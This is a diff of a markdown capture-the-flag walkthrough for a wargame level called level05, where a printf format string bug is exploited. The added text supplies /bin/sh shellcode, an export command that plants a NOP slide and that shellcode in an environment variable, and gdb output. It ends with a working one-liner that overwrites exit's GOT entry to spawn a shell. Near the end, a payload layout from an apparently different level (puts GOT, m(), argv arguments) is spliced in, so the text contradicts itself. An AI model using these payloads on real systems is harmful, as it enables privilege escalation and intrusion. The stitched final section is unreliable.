@@ -27,7 +27,7 @@ Let's take a deeper look at the program. See [dissasembly notes](https://github.
 
 This program is a basic ```tolower()```, which is of little interest to us. 
 
-However we do see a call to ```printf()```, which is vulnerable to buffer overflow. 
+However we do see a call to ```printf()```, which is vulnerable to string format exploits. 
 
 We also see a call to ```exit()```.
 
@@ -42,15 +42,63 @@ aaaa 64 f7fcfac0 f7ec3af9 ffffd69f ffffd69e 0 ffffffff ffffd724 f7fdb000 6161616
 
 Unfortunately, we see the stack is non-executable. 
 
-We can overflow the buffer, but we can't overwrite the EIP with an address (like system("/bin/sh")) in the stack because it won't execute.
+We can overflow the buffer, but we can't overwrite the EIP with an address (like ```system("/bin/sh")```) in the stack because it won't execute.
 ```
 level05@OverRide:~$ dmesg | grep "Execute Disable"
 [    0.000000] NX (Execute Disable) protection: active
 ```
-We're going to have to launch a shell another way. 
 
-We will use [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php), and save it in an environment variable.  ```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80```
+Instead, we will use [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php).
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+```
+We will prefix the shellcode with a 100 byte NOP slide, and then store it all in an environment variable. 
+```
+level05@OverRide:~$ export SHELLCODE=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
+```
 
+Let's find the address of our malicious environment variable. 
+```
+(gdb) break *main+4
+Breakpoint 1 at 0x8048448
+(gdb) r
+[...]
+(gdb) x/200s environ
+0xffffd806:	 "/home/users/level05/level05"
+0xffffd822:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
+0xffffd8a8:	 "SHELL=/bin/bash"
+```
+Our malicious shellcode is at ```0xffffd822```. 
+Note: we want to move past the first 10 bytes "SHELLCODE=" and into your NOP slide, so let's make the address of our shellcode ```0xffffd822 + A (10 bytes) -> 0xffffd826```.
+
+Unfortunately, ```0xffffd826``` is too large to pass to ```printf()``` in decimal with a ```%d``` format (it overflows maxint).
+```
+2147483647 <- maximum size of int
+4294957094 <- address of shellcode in decimal
+```
+
+So our attack takes place in 2 steps:
+- malicious environment variable
+"NOP slide [100 bytes] + call to open a shell"
+
+- format string attack
+"exit GOT address [byte 1] + exit GOT address [byte 2] + shellcode addr [2 bytes] + '%10$hn' + shellcode addr [2 bytes] + '%11$hn'"
+
+```
+(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05
+```
+
+
+Here is what our string attack should look like:
+- pad of arbitrary data [20 bytes]
+- puts() GOT address [4 bytes]
+- address of m() [4 bytes]
+Let's visualize that. 
+```
+"paddings [20 bytes] + GOT address of puts" + "address of m()"
+                  argv[1]                          argv[2]
+```
+Let's try it out!
 
 
 
